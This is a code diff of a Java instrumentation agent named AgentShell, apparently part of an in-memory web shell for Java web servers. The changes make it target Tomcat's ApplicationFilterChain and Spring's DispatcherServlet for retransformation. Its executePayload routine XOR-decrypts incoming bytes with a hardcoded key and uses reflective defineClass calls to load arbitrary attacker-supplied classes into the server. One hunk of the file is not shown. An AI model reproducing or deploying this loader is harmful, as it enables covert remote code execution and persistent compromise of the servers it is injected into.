@@ -1,56 +1,61 @@
 import java.lang.instrument.Instrumentation;
+import java.lang.instrument.ClassFileTransformer;
+import java.security.ProtectionDomain;
+import java.io.*;
 import java.lang.reflect.Method;
-import java.lang.reflect.Constructor;
 
-public class AgentShell {
+public class AgentShell implements ClassFileTransformer {
 
     private static Object globalLoader = null;
     private static final String GLOBAL_KEY = "[KEY]           ";
 
-    public static void agentmain(String agentArgs, Instrumentation inst) {
-        initAgent(inst);
-    }
-
     public static void premain(String agentArgs, Instrumentation inst) {
-        initAgent(inst);
+        init(inst);
     }
 
-    private static void initAgent(Instrumentation inst) {
+    public static void agentmain(String agentArgs, Instrumentation inst) {
+        init(inst);
+    }
+
+    private static void init(Instrumentation inst) {
         try {
-            Class<?>[] allClasses = inst.getAllLoadedClasses();
-            for (Class<?> clazz : allClasses) {
-                String className = clazz.getName();
-                if (className.equals("org.springframework.web.servlet.DispatcherServlet")) {
+            inst.addTransformer(new AgentShell(), true);
+            Class<?>[] classes = inst.getAllLoadedClasses();
+            for (Class<?> c : classes) {
+                if (c.getName().equals("org.apache.catalina.core.ApplicationFilterChain") ||
+                    c.getName().equals("org.springframework.web.servlet.DispatcherServlet")) {
                     try {
-                        inst.retransformClasses(clazz);
-                    } catch (Exception ignored) {
-                    }
+                        inst.retransformClasses(c);
+                    } catch (Exception ignored) {}
                 }
             }
-        } catch (Throwable t) {
-            t.printStackTrace();
-        }
+        } catch (Exception ignored) {}
     }
 
-    public static synchronized String executePayload(byte[] encryptedData, ClassLoader parentLoader) {
-        try {
-            byte[] xorDecrypted = decryptPayload(encryptedData, GLOBAL_KEY);
-            
-            boolean isLoaderInitRequest = (xorDecrypted.length > 4 && 
-                xorDecrypted[0] == (byte)0xCA && xorDecrypted[1] == (byte)0xFE && 
-                xorDecrypted[2] == (byte)0xBA && xorDecrypted[3] == (byte)0xBE);
+    @Override
+    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) {
+        return null;
+    }
 
-            if (isLoaderInitRequest) {
+    public static String executePayload(byte[] encryptedData, ClassLoader parentLoader) {
+        try {
+            byte[] decrypted = new byte[encryptedData.length];
+            byte[] keyBytes = GLOBAL_KEY.getBytes();
+            int keyLength = keyBytes.length;
+            for (int i = 0; i < encryptedData.length; i++) {
+                decrypted[i] = (byte) (encryptedData[i] ^ keyBytes[(i + 1) % keyLength]);
+            }
+
+            boolean isInit = (decrypted.length > 4 && decrypted[0] == (byte)0xCA && decrypted[1] == (byte)0xFE && decrypted[2] == (byte)0xBA && decrypted[3] == (byte)0xBE);
+
+            if (isInit) {
                 if (globalLoader != null) {
-                    return "LOADER_ALREADY_EXISTS_RESPONSE";
+                    return "LOADER_ALREADY_EXISTS";
                 } else {
                     Method defineMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                     defineMethod.setAccessible(true);
-
-                    Class<?> clazz = (Class<?>) defineMethod.invoke(parentLoader, xorDecrypted, 0, xorDecrypted.length);
-                    Constructor<?> constructor = clazz.getConstructor(ClassLoader.class);
-                    globalLoader = constructor.newInstance(parentLoader);
-
+                    Class<?> clazz = (Class<?>) defineMethod.invoke(parentLoader, decrypted, 0, decrypted.length);
+                    globalLoader = clazz.getDeclaredConstructor(ClassLoader.class).newInstance(parentLoader);
                     return "LOADER_INIT_SUCCESS";
                 }
             } else {
@@ -64,16 +69,5 @@ public class AgentShell {
         } catch (Exception e) {
             return "EXEC_FAILED: " + e.toString();
         }
-    }
-
-    private static byte[] decryptPayload(byte[] data, String keyStr) {
-        if (data == null || data.length == 0 || keyStr == null) return new byte[0];
-        byte[] decrypted = new byte[data.length];
-        byte[] keyBytes = keyStr.getBytes();
-        int keyLength = keyBytes.length;
-        for (int i = 0; i < data.length; i++) {
-            decrypted[i] = (byte) (data[i] ^ keyBytes[(i + 1) % keyLength]);
-        }
-        return decrypted;
     }
 }
